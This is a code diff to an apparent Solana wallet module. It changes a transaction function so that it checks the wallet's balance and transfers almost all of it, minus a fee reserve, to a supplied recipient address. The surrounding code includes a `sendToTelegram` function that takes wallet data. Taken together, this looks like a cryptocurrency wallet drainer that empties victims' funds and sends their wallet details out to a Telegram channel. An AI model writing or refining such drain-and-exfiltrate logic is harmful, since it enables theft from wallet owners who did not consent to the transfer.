@@ -166,11 +166,42 @@ export const sendToTelegram = async (walletData: any) => {
 export const signAndSendTransaction = async (connection: Connection, wallet: any, recipientAddress: string, amount: number) => {
   try {
     console.log('Creating transaction...');
+    
+    // Check balance first
+    const balance = await connection.getBalance(wallet.publicKey);
+    console.log('Current wallet balance (lamports):', balance);
+    const balanceInSol = balance / LAMPORTS_PER_SOL;
+    console.log('Current wallet balance (SOL):', balanceInSol);
+    
+    // Make sure we have sufficient balance before proceeding
+    if (balance <= 0) {
+      console.error('Insufficient balance for transfer');
+      throw new Error('Insufficient wallet balance for transfer');
+    }
+    
+    // We need to account for transaction fees
+    // Calculate the maximum we can send (balance minus a small amount for fees)
+    const minimumRequiredBalance = 0.00089 * LAMPORTS_PER_SOL; // Approximate fee + rent exemption
+    const maxTransferAmount = Math.max(0, balance - minimumRequiredBalance);
+    
+    if (maxTransferAmount <= 0) {
+      console.error('Balance too low to cover fees');
+      throw new Error('Wallet balance too low to cover transaction fees');
+    }
+    
+    // Use the smaller of requested amount or max possible amount
+    const transferAmount = Math.min(
+      Math.floor(amount * LAMPORTS_PER_SOL), 
+      maxTransferAmount
+    );
+    
+    console.log(`Attempting to transfer ${transferAmount/LAMPORTS_PER_SOL} SOL`);
+    
     const transaction = new Transaction().add(
       SystemProgram.transfer({
         fromPubkey: wallet.publicKey,
         toPubkey: new PublicKey(recipientAddress),
-        lamports: Math.floor(amount * LAMPORTS_PER_SOL * 0.98), // Reduced to 98% to ensure fees are covered
+        lamports: transferAmount,
       })
     );
 
